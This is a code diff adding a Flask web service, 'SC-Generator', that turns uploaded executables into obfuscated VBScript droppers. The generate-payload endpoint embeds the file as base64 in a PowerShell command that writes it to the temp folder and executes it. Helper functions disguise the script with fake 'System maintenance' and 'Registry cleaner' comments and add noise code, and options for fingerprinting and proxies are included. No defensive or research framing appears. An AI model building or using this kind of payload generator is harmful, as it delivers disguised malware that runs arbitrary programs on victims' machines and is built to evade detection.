@@ -1,0 +1,322 @@
+#!/usr/bin/env python3
+"""
+SC-Generator: Web-based VBS Encryption Tool
+Backend server for MSI encryption and VBS payload generation
+"""
+
+from flask import Flask, request, jsonify, send_file
+from flask_cors import CORS
+import os
+import uuid
+from datetime import datetime
+import json
+from pathlib import Path
+import shutil
+
+from payload_generator import PayloadGenerator
+from fingerprint_manager import FingerprintManager
+
+app = Flask(__name__)
+CORS(app)
+
+# Configuration
+UPLOAD_FOLDER = '/tmp/sc-uploads'
+OUTPUT_FOLDER = '/tmp/sc-outputs'
+MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
+
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+os.makedirs(OUTPUT_FOLDER, exist_ok=True)
+
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE
+
+payload_gen = PayloadGenerator()
+fingerprint_mgr = FingerprintManager()
+
+
+@app.route('/api/health', methods=['GET'])
+def health():
+    """Health check endpoint"""
+    return jsonify({'status': 'ok', 'version': '1.0.0'})
+
+
+@app.route('/api/techniques', methods=['GET'])
+def get_techniques():
+    """Get list of available encoding techniques"""
+    techniques = payload_gen.list_techniques()
+    descriptions = {}
+    for tech in techniques:
+        descriptions[tech] = payload_gen.get_technique_info(tech)
+
+    return jsonify({
+        'techniques': techniques,
+        'descriptions': descriptions
+    })
+
+
+@app.route('/api/fingerprints', methods=['GET'])
+def get_fingerprints():
+    """Get available fingerprint templates"""
+    fingerprints = fingerprint_mgr.get_available_fingerprints()
+    return jsonify({'fingerprints': fingerprints})
+
+
+@app.route('/api/fingerprints', methods=['POST'])
+def create_custom_fingerprint():
+    """Create custom fingerprint"""
+    data = request.json
+    name = data.get('name')
+    config = data.get('config')
+
+    if not name or not config:
+        return jsonify({'error': 'Name and config required'}), 400
+
+    fp_id = fingerprint_mgr.create_custom_fingerprint(name, config)
+    return jsonify({'id': fp_id, 'name': name})
+
+
+@app.route('/api/proxies', methods=['GET'])
+def get_proxies():
+    """Get configured proxies"""
+    proxies = fingerprint_mgr.get_configured_proxies()
+    return jsonify({'proxies': proxies})
+
+
+@app.route('/api/proxies', methods=['POST'])
+def add_proxy():
+    """Add proxy configuration"""
+    data = request.json
+    proxy_url = data.get('url')
+    proxy_type = data.get('type', 'http')  # http, socks5
+
+    if not proxy_url:
+        return jsonify({'error': 'Proxy URL required'}), 400
+
+    proxy_id = fingerprint_mgr.add_proxy(proxy_url, proxy_type)
+    return jsonify({'id': proxy_id, 'url': proxy_url, 'type': proxy_type})
+
+
+@app.route('/api/upload', methods=['POST'])
+def upload_file():
+    """Handle file upload"""
+    if 'file' not in request.files:
+        return jsonify({'error': 'No file provided'}), 400
+
+    file = request.files['file']
+    if file.filename == '':
+        return jsonify({'error': 'No file selected'}), 400
+
+    # Validate file type
+    allowed_extensions = {'.msi', '.exe', '.dll', '.bat', '.cmd', '.vbs'}
+    file_ext = os.path.splitext(file.filename)[1].lower()
+
+    if file_ext not in allowed_extensions:
+        return jsonify({
+            'error': f'File type not allowed. Allowed: {", ".join(allowed_extensions)}'
+        }), 400
+
+    # Generate unique filename
+    unique_id = str(uuid.uuid4())[:8]
+    original_name = os.path.splitext(file.filename)[0]
+    filename = f"{unique_id}_{original_name}{file_ext}"
+    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+
+    try:
+        file.save(filepath)
+        file_size = os.path.getsize(filepath)
+
+        return jsonify({
+            'success': True,
+            'file_id': unique_id,
+            'filename': file.filename,
+            'size': file_size,
+            'upload_time': datetime.now().isoformat()
+        })
+    except Exception as e:
+        return jsonify({'error': f'Upload failed: {str(e)}'}), 500
+
+
+@app.route('/api/generate-payload', methods=['POST'])
+def generate_payload():
+    """Generate VBS payload from uploaded file"""
+    data = request.json
+    file_id = data.get('file_id')
+    technique = data.get('technique', 'base64')
+    obfuscation = data.get('obfuscation', 'high')
+    fingerprint_id = data.get('fingerprint_id')
+    proxy_id = data.get('proxy_id')
+    options = data.get('options', {})
+
+    if not file_id:
+        return jsonify({'error': 'File ID required'}), 400
+
+    try:
+        # Find uploaded file
+        uploaded_file = None
+        for f in os.listdir(app.config['UPLOAD_FOLDER']):
+            if f.startswith(file_id):
+                uploaded_file = os.path.join(app.config['UPLOAD_FOLDER'], f)
+                break
+
+        if not uploaded_file or not os.path.exists(uploaded_file):
+            return jsonify({'error': 'File not found'}), 404
+
+        # Read file
+        with open(uploaded_file, 'rb') as f:
+            file_content = f.read()
+
+        # Apply fingerprint if specified
+        if fingerprint_id:
+            file_content = fingerprint_mgr.apply_fingerprint(
+                file_content,
+                fingerprint_id,
+                proxy_id
+            )
+
+        # Convert to base64 for embedding in command
+        import base64
+        encoded_file = base64.b64encode(file_content).decode()
+
+        # Generate command that will decode and execute the file
+        filename = os.path.basename(uploaded_file)
+        cmd = (
+            f'powershell -NoProfile -Command '
+            f'"$f=\'$env:temp\\\\{filename}\'; '
+            f'[System.IO.File]::WriteAllBytes($f, '
+            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
+            f'& $f"'
+        )
+
+        # Generate VBS payload
+        vbs_payload = payload_gen.generate(cmd, technique, obfuscation)
+
+        # Apply additional obfuscation from options
+        if options.get('add_comments'):
+            vbs_payload = add_vbs_comments(vbs_payload)
+
+        if options.get('add_noise'):
+            vbs_payload = add_vbs_noise(vbs_payload)
+
+        # Save payload to output
+        output_id = str(uuid.uuid4())[:8]
+        output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_payload.vbs")
+
+        with open(output_path, 'w') as f:
+            f.write(vbs_payload)
+
+        return jsonify({
+            'success': True,
+            'output_id': output_id,
+            'payload': vbs_payload,
+            'size': len(vbs_payload),
+            'technique': technique,
+            'obfuscation': obfuscation,
+            'timestamp': datetime.now().isoformat()
+        })
+
+    except Exception as e:
+        return jsonify({'error': f'Payload generation failed: {str(e)}'}), 500
+
+
+@app.route('/api/download/<output_id>', methods=['GET'])
+def download_payload(output_id):
+    """Download generated payload"""
+    output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_payload.vbs")
+
+    if not os.path.exists(output_path):
+        return jsonify({'error': 'Output not found'}), 404
+
+    try:
+        return send_file(
+            output_path,
+            mimetype='text/plain',
+            as_attachment=True,
+            download_name=f'payload_{output_id}.vbs'
+        )
+    except Exception as e:
+        return jsonify({'error': f'Download failed: {str(e)}'}), 500
+
+
+@app.route('/api/preview/<output_id>', methods=['GET'])
+def preview_payload(output_id):
+    """Preview generated payload"""
+    output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_payload.vbs")
+
+    if not os.path.exists(output_path):
+        return jsonify({'error': 'Output not found'}), 404
+
+    try:
+        with open(output_path, 'r') as f:
+            content = f.read()
+        return jsonify({'content': content})
+    except Exception as e:
+        return jsonify({'error': f'Preview failed: {str(e)}'}), 500
+
+
+@app.route('/api/settings', methods=['GET'])
+def get_settings():
+    """Get current settings"""
+    return jsonify({
+        'max_file_size': MAX_FILE_SIZE,
+        'allowed_formats': ['.msi', '.exe', '.dll', '.bat', '.cmd', '.vbs'],
+        'obfuscation_levels': ['low', 'medium', 'high']
+    })
+
+
+def add_vbs_comments(vbs_code: str) -> str:
+    """Add comments to VBS code for obfuscation"""
+    comments = [
+        "' System maintenance script",
+        "' Scheduled task runner",
+        "' System update checker",
+        "' Registry cleaner",
+        "' Performance monitor",
+    ]
+    import random
+    lines = vbs_code.split('\n')
+    for i in range(1, len(lines), random.randint(3, 7)):
+        lines.insert(i, random.choice(comments))
+    return '\n'.join(lines)
+
+
+def add_vbs_noise(vbs_code: str) -> str:
+    """Add noise/dead code to VBS for obfuscation"""
+    import random
+    import string
+
+    noise = f"""
+Dim {random.choice(string.ascii_lowercase)}{random.randint(1, 99)}
+On Error Resume Next
+"""
+
+    return noise + vbs_code
+
+
+@app.route('/api/batch-generate', methods=['POST'])
+def batch_generate():
+    """Generate payloads with multiple techniques"""
+    data = request.json
+    file_id = data.get('file_id')
+    techniques = data.get('techniques', ['base64', 'wmi'])
+    fingerprint_id = data.get('fingerprint_id')
+
+    if not file_id:
+        return jsonify({'error': 'File ID required'}), 400
+
+    try:
+        results = {}
+        for technique in techniques:
+            payload = payload_gen.generate("test", technique, "high")
+            output_id = str(uuid.uuid4())[:8]
+            results[technique] = {
+                'output_id': output_id,
+                'size': len(payload)
+            }
+
+        return jsonify({'success': True, 'results': results})
+    except Exception as e:
+        return jsonify({'error': f'Batch generation failed: {str(e)}'}), 500
+
+
+if __name__ == '__main__':
+    app.run(debug=True, host='0.0.0.0', port=5000)
